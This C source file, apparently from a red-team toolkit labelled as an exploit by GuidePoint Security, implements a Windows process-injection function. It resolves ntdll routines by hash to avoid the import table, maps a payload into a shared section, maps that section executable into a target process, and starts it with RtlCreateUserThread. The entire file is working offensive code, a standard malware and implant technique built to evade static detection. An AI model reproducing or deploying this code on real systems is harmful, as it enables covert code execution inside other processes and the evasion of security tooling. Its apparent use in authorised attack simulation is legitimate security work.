/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtUnmapViewOfSection );
	D_API( RtlCreateUserThread );
	D_API( NtMapViewOfSection );
	D_API( NtCreateSection );
	D_API( NtOpenProcess );
	D_API( NtClose );
} API ;


#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
#define H_API_RTLCREATEUSERTHREAD	0x6c827322 /* RtlCreateUserThread */
#define H_API_NTMAPVIEWOFSECTION	0xd6649bca /* NtMapViewOfSection */
#define H_API_NTCREATESECTION		0xb80f7b50 /* NtCreateSection */
#define H_API_NTOPENPROCESS		0x4b82f718 /* NtOpenProcess */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Injects a target process with the payload. Returns
 * a thread id to the caller on success.
 *
!*/

D_SEC( C ) BOOL InjectProcess( _In_ DWORD Pid, _In_ PVOID Buffer, _In_ ULONG Length, _Out_ PHANDLE Thread )
{
	API			Api;
	CLIENT_ID		Cid;
	LARGE_INTEGER		Lin;
	OBJECT_ATTRIBUTES	Obj;

	BOOL			Suc = FALSE;
	SIZE_T			Len = 0;

	HANDLE			Prc = NULL;
	HANDLE			Thd = NULL;
	HANDLE			Sec = NULL;
	LPVOID			Lcl = NULL;
	LPVOID			Rem = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Lin, sizeof( Lin ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );

	Api.NtUnmapViewOfSection = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.RtlCreateUserThread  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
	Api.NtMapViewOfSection   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAPVIEWOFSECTION );
	Api.NtCreateSection      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATESECTION );
	Api.NtOpenProcess        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtClose              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Lin.QuadPart      = U_PTR( Length );
	Cid.UniqueThread  = NULL;
	Cid.UniqueProcess = C_PTR( U_PTR( Pid ) );

	*Thread = NULL;

	InitializeObjectAttributes( &Obj, NULL, 0, NULL, NULL );

	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Obj, &Cid ) ) ) {
		if ( NT_SUCCESS( Api.NtCreateSection( &Sec, SECTION_ALL_ACCESS, NULL, &Lin, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL ) ) ) {
			if ( NT_SUCCESS( Api.NtMapViewOfSection( Sec, NtCurrentProcess(), &Lcl, 0, 0, 0, &Len, ViewShare, 0, PAGE_READWRITE ) ) ) {
				__builtin_memcpy( Lcl, Buffer, Length );
				if ( NT_SUCCESS( Api.NtMapViewOfSection( Sec, Prc, &Rem, 0, 0, 0, &Len, ViewShare, 0, PAGE_EXECUTE ) ) ) {
					if ( NT_SUCCESS( Api.RtlCreateUserThread( Prc, NULL, FALSE, 0, 0, 0, Rem, NULL, &Thd, NULL ) ) ) {
						Suc = TRUE; *Thread = Thd;
					};
				};
				Api.NtUnmapViewOfSection( NtCurrentProcess(), Lcl );
			};
			Api.NtClose( Sec );
		};
		Api.NtClose( Prc );
	};
	return Suc;
};
